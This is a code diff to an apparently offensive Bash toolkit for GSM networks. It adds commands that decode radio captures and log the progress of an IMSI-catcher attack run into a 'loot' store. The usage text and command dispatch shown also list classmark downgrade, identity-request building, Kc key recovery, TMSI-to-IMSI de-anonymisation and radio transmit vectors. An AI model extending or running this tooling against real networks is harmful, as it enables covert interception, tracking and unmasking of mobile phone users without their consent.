+    seen=$(printf '%s\n' "$prog" | awk -F'\t' '$7=="seen"' | grep -c . || true)
+    if [[ -f "$GATK_DEANON_DB" ]]; then
+        idents=$(awk -F'\t' 'NF>=8{n++} END{print n+0}' "$GATK_DEANON_DB")
+    fi
+    printf 'run\t%s\n' "$run"
+    printf 'steps_total\t%s\n' "${total:-0}"
+    printf 'steps_seen\t%s\n' "${seen:-0}"
+    printf 'identities\t%s\n' "${idents:-0}"
+    printf 'store\t%s\n' "$(gatk_catcher_store)"
+    printf 'note\ta run ends here for the record only: the capture store and the observations stay where they are\n'
+}
+
+gatk_catcher_watch() {
+    local pcap="" run="" since="" source=""
+    while (( $# )); do
+        case "$1" in
+            --run)    run="${2:-}";    shift 2 || return 2 ;;
+            --since)  since="${2:-}";  shift 2 || return 2 ;;
+            --source) source="${2:-}"; shift 2 || return 2 ;;
+            -*)  printf 'ERROR\t--catcher-watch: unknown option %s\n' "$(gatk_sanitize "$1")" >&2; return 2 ;;
+            *)   [[ -z "$pcap" ]] || {
+                     printf 'ERROR\t--catcher-watch takes one capture\n' >&2; return 2; }
+                 pcap="$1"; shift ;;
+        esac
+    done
+    [[ -z "$since" || "$since" =~ ^[0-9]+$ ]] || {
+        printf 'ERROR\t--since takes an epoch second, got %s\n' "$(gatk_sanitize "$since")" >&2; return 2; }
+
+    if [[ -n "$pcap" ]]; then
+        [[ -f "$pcap" ]] || {
+            printf 'ERROR\tno such capture: %s\n' "$(gatk_sanitize "$pcap")" >&2; return 1; }
+        local mod="$IMSISTING_ROOT/modules/03_gsmtap.sh"
+        [[ -r "$mod" ]] || {
+            printf 'ERROR\tcannot read %s\n' "$mod" >&2
+            printf 'WHY\tGSMTAP belongs to 03_gsmtap.sh; decoding a capture here would be a second parser for the same header, and two parsers disagree eventually\n' >&2
+            return 2; }
+        command -v python3 >/dev/null 2>&1 || {
+            printf 'ERROR\tpython3 not found\n' >&2
+            printf 'WHY\t03_gsmtap.sh reads the GSMTAP header with python3 struct unpacking\n' >&2
+            return 2; }
+        mkdir -p "$GATK_DIR" 2>/dev/null
+        if ! bash "$mod" --read "$pcap" >/dev/null 2>"$GATK_DIR/watch.err"; then
+            printf 'ERROR\t03_gsmtap.sh could not decode %s\n' "$(gatk_sanitize "$pcap")" >&2
+            sed -n '1,3p' "$GATK_DIR/watch.err" >&2
+            return 1
+        fi
+        source="${source:-gsmtap:$(basename "$pcap")}"
+    fi
+
+    local gstore; gstore=$(gatk_gsmtap_store)
+    [[ -f "$gstore" ]] || {
+        printf 'ERROR\tno GSMTAP store at %s\n' "$gstore" >&2
+        printf 'WHY\tnothing has been decoded yet; pass a capture to --catcher-watch or run 03_gsmtap.sh --read first\n' >&2
+        return 1; }
+
+    gatk_catcher_init
+    run=$(gatk_catcher_run_name "$run")
+    local db; db=$(gatk_catcher_store)
+    [[ -z "$source" ]] && source="gsmtap:store"
+
+    local rows=0 decoded=0 unknown=0 unshaped=0 matched=0
+    local chan uplink pl epoch out rc step proto t name iso first_epoch
+    declare -A seen_step=() step_count=()
+    if [[ -f "$db" ]]; then
+        while IFS=$'\t' read -r s _; do [[ -n "$s" ]] && seen_step["$s"]=1; done < <(
+            awk -F'\t' -v r="$run" 'NR>1 && $3==r { print $4"\t1" }' "$db")
+    fi
+
+    while IFS=$'\t' read -r chan uplink pl epoch; do
+        [[ -n "$pl" ]] || continue
+        (( ${#since} )) && [[ "$epoch" =~ ^[0-9]+$ ]] && (( epoch < since )) && continue
+        rows=$(( rows + 1 ))
+        rc=0; out=$(gatk_decode_frame "$pl" "$chan" 2>/dev/null) || rc=$?
+        case $rc in
+            0) decoded=$(( decoded + 1 )) ;;
+            3) unknown=$(( unknown + 1 )); continue ;;
+            4) unshaped=$(( unshaped + 1 )); continue ;;
+            *) continue ;;
+        esac
+        proto=$(printf '%s\n' "$out" | awk -F'\t' '$1=="protocol"{print $2; exit}')
+        t=$(printf '%s\n' "$out" | awk -F'\t' '$1=="message_type"{print $2; exit}')
+        name=$(printf '%s\n' "$out" | awk -F'\t' '$1=="message"{print $2; exit}')
+        step=$(gatk_catcher_step_of "$proto" "$t")
+        [[ -n "$step" ]] || continue
+        matched=$(( matched + 1 ))
+        if [[ -n "${seen_step[$step]:-}" ]]; then
+            step_count["$step"]=$(( ${step_count["$step"]:-0} + 1 ))
+            continue
+        fi
+        seen_step["$step"]=1
+        step_count["$step"]=1
+        iso=$(date -u -d "@${epoch:-0}" +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo "-")
+        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+            "$iso" "${epoch:--}" "$run" "$step" "$(printf '%s' "${chan:-?}")" \
+            "$([[ "$uplink" == yes ]] && echo UL || echo DL)" \
+            "$proto" "$t" "$name" "$source" >> "$db"
+    done < <(awk -F'\t' 'NR>1 && $2 ~ /^GSM Um/ { print $3"\t"$5"\t"$11"\t"$12 }' "$gstore")
+
+    local steps; steps=$(awk -F'\t' -v r="$run" 'NR>1 && $3==r { print $4 }' "$db" | sort -un | wc -l)
+    printf 'run\t%s\n' "$run"
+    printf 'frames\t%s\n' "$rows"
+    printf 'decoded\t%s\n' "$decoded"
+    printf 'unmatched\t%s\n' "$(( decoded - matched ))"
+    printf 'unknown_type\t%s\n' "$unknown"
+    printf 'unshaped\t%s\n' "$unshaped"
+    printf 'steps_seen\t%s\n' "${steps// /}"
+    printf 'steps_total\t14\n'
+    printf 'store\t%s\n' "$db"
+    if (( rows == 0 )); then
+        printf 'note\tthe GSMTAP store holds no GSM Um frames in that window\n'
+        return 1
+    fi
+    if (( decoded == 0 )); then
+        printf 'note\tthere were frames and none carried a message this table names\n'
+        return 1
+    fi
+    return 0
+}
+
+gatk_catcher_progress_tsv() {
+    local run=""
+    while (( $# )); do
+        case "$1" in
+            --run) run="${2:-}"; shift 2 || return 2 ;;
+            *) printf 'ERROR\t--catcher-progress-tsv: unknown option %s\n' "$(gatk_sanitize "$1")" >&2; return 2 ;;
+        esac
+    done
+    run=$(gatk_catcher_run_name "$run")
+    local plan db tmp; tmp=$(mktemp "${TMPDIR:-/tmp}/gatk-plan.XXXXXX") || return 1
+    gatk_imsi_catcher_sequence > "$tmp"
+    db=$(gatk_catcher_store); [[ -f "$db" ]] || db=/dev/null
+    printf 'step\tchannel\tdirection\tmessage\tprotocol\tmessage_type\tstate\tfirst_seen\tobservations\n'
+    awk -F'\t' -v run="$run" '
+        FILENAME == ARGV[1] {
+            if (FNR == 1) next
+            step[FNR]=$1; chan[FNR]=$2; dir[FNR]=$3; msg[FNR]=$4; proto[FNR]=$5; typ[FNR]=$6
+            rows=FNR
+            next
+        }
+        FNR == 1 { next }
+        $3 == run { s=$4; n[s]++; if (t[s] == "") t[s]=$1 }
+        END {
+            for (i = 2; i <= rows; i++) {
+                s = step[i]
+                printf "%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%d\n", s, chan[i], dir[i], msg[i], proto[i], typ[i], \
+                    (s in n ? "seen" : "unseen"), (t[s] == "" ? "-" : t[s]), n[s]+0
+            }
+        }' "$tmp" "$db"
+    local rc=$?; rm -f "$tmp"; return $rc
+}
+
+gatk_catcher_observations_tsv() {
+    local run="" limit=0
+    while (( $# )); do
+        case "$1" in
+            --run)   run="${2:-}";   shift 2 || return 2 ;;
+            --limit) limit="${2:-0}"; shift 2 || return 2 ;;
+            *) printf 'ERROR\t--catcher-observations-tsv: unknown option %s\n' "$(gatk_sanitize "$1")" >&2; return 2 ;;
+        esac
+    done
+    [[ "$limit" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--limit takes a number\n' >&2; return 2; }
+    run=$(gatk_catcher_run_name "$run")
+    local db; db=$(gatk_catcher_store)
+    [[ -f "$db" ]] || { printf 'ERROR\tno observations yet in %s\n' "$db" >&2; return 1; }
+    gatk_catcher_header
+    if (( limit > 0 )); then
+        awk -F'\t' -v r="$run" 'NR>1 && $3==r' "$db" | tail -n "$limit"
+    else
+        awk -F'\t' -v r="$run" 'NR>1 && $3==r' "$db"
+    fi
+}
+
 gatk_cli_main() {
     local cmd="${1:-}"
     (($# > 0)) && shift
@@ -4651,6 +4174,11 @@ gatk_cli_main() {
         --classmark-downgrade) gatk_classmark_downgrade "${1:-}" ;;
         --build-identity-request) gatk_build_identity_request "${1:-1}" ;;
         --imsi-catcher-sequence)  gatk_cmd_imsi_catcher_sequence ;;
+        --catcher-watch)       gatk_catcher_watch "$@" ;;
+        --catcher-progress-tsv) gatk_catcher_progress_tsv "$@" ;;
+        --catcher-observations-tsv) gatk_catcher_observations_tsv "$@" ;;
+        --catcher-run-start)   gatk_catcher_run_start "$@" ;;
+        --catcher-run-stop)    gatk_catcher_run_stop ;;
         --paging-race)         gatk_paging_race "${1:-3}" ;;
         --c1)                  gatk_c1 "${1:-}" "${2:-}" "${3:-}" "${4:-}" ;;
         --kc-recovery)         gatk_cmd_kc_recovery ;;
@@ -4827,6 +4355,21 @@ Usage: $0 COMMAND
   --deanon-list                every pairing recorded so far
   --deanon-confirm <tmsi> <imsi> <observed-block> [pam] [pblocks] [res]
                                test a pairing against the paging schedule
+
+  Catcher observations -- the air side of the sequence above
+  (loot/gsm_attack/catcher.tsv: one row per message that actually crossed):
+  --catcher-watch [capture.pcap] [--run NAME] [--since EPOCH] [--source S]
+                               read a capture and record every sequence step
+                               it contains. Without a capture it reads the
+                               GSMTAP store 03_gsmtap.sh already decoded. A
+                               step nobody observed stays unseen: nothing is
+                               added to the store that was not in a frame.
+  --catcher-progress-tsv [--run NAME]
+                               every plan step with seen/unseen against the air
+  --catcher-observations-tsv [--run NAME] [--limit N]
+                               the observed frames themselves, oldest first
+  --catcher-run-start [NAME]   name the run the next observations join
+  --catcher-run-stop           close the run and summarise it
 
   Transmit vectors (full TSV plan: every message, burst, frame and channel;
   the radio itself stays behind --tx-ack):
